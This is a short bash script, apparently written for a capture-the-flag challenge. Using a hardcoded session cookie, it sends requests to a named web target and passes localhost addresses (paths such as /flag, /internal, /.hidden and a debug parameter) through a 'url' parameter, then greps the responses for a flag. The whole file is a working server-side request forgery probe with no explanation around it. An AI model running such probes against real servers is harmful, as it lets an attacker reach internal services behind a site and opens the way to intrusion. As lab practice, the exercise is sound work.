#!/bin/bash

COOKIE="PHPSESSID=gf9005inq1cs30gou9aosv2vec"
TARGET="http://sdfa.store/auth/main.php"

paths=(
  "/flag"
  "/flag/flag"
  "/api/flag"
  "/internal"
  "/?token=0"
  "/index.php?debug=1"
  "/.hidden"
)

for path in "${paths[@]}"; do
  echo "[*] Testing: $path"

  RESPONSE=$(curl -sG "$TARGET" \
    --data-urlencode "url=http://127.0.0.1$path" \
    -H "Cookie: $COOKIE")

  if echo "$RESPONSE" | grep -q "flag{"; then
    echo "[+] ✅ FLAG FOUND on path: $path"
    echo "$RESPONSE" | grep -oE "flag\{[^}]+\}"
    break
  fi
done
